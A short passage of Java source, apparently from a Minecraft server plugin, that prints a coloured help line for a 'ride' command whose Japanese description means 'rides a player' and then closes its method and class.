                MainAPI.getPrefix(MainAPI.PrefixType.SECONDARY) + ChatColor.GOLD + "ride" + ChatColor.GRAY + ": " + ChatColor.YELLOW + "プレイヤーに乗ります。");
        return;
    }
}
